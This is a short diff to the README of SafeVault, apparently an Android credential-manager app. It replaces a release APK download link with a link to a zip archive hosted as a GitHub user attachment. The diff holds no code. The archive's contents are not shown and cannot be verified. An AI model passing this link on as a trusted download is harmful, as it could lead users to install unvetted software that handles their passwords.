@@ -10,7 +10,7 @@ A secure, lightweight, and user-friendly credential management system designed t
 
 ## 📲 Download SafeVault
 
-[**📥 Download Android APK (v1.0.0)**](https://github.com/yourusername/safeVault-credential-manager/releases/download/v1.0.0/app-debug.apk)
+[**📥 SafeVault Credential Manager – Download Android APK (v1.3.0)**](https://github.com/user-attachments/files/24404664/SafeVault.Credential.Manager.v1.3.0.zip)
 
 ---
 
